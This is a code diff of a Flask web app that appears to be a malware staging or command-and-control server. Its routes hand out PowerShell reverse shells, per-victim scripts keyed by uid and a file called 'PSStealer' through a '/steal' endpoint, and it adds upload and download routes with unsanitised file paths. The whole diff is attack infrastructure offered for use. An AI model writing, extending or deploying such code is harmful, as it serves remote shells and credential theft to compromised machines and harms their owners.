@@ -1,5 +1,6 @@
-from flask import request,jsonify,render_template,Blueprint,current_app
-from ecs.shell import *
+from flask import request,jsonify,render_template,Blueprint,current_app,send_file,abort
+from ecs.funcs import *
+from ecs.shell import return_shell
 url = 'https://rev.rcsis.ir/down/access'
 
 
@@ -13,7 +14,17 @@ def main():
     uid = data.get('uid')
     step = data.get('s')
     if step == '3':
-        return return_shell(url,request)
+        return return_shell(file="shells/pws/PSShell",request=request)
+    
+    elif step == '4':
+        response =   (read_file(f"shells/pws/PSAccess")).replace("{uid}",f"{uid}")
+        return response,200
+    elif step == '5':
+        response = read_file(f"clients/{uid}/{uid}.ps1")
+        if(response):
+            return response,200
+        else:
+            pass
     context = {
         'uid': uid,
         'step': step,
@@ -29,6 +40,19 @@ def main():
 def uid():
     uid = generate_uid()
     return jsonify({"uid": uid})
+
+
+
+
+@main_blueprint .route('/test', methods=['POST','GET'])
+def test():
+    file = request.files.items()
+    response = ""
+    for key, value in request.files.items():
+        response = response + f"Key: {key}, Value: {value}"
+    print(response)
+    return response,200
+
 
 
 
@@ -61,3 +85,23 @@ def upload_file():
             file_path = f'{sys.path[0]}/uploads/{file.filename}'
             file.save(f"{file_path}")            
         return jsonify({"message": "File successfully uploaded", "file_path": file_path}), 200
+
+
+
+@main_blueprint .route('/down/<filename>', methods=['GET'])
+def download(filename):
+    if request.method == 'GET':
+        directory = f'{sys.path[0]}/downloads/'
+        try:
+         # Send the file to the client
+            return send_file(f"{directory}{filename}", as_attachment=True)
+        except Exception as e:
+            return f"ready golam 🌹",404
+    
+
+
+@main_blueprint .route('/steal', methods=['GET'])
+def steal():
+    if request.method == 'GET':
+        response = read_file(f'shells/pws/PSStealer')
+        return f"{response}", 200
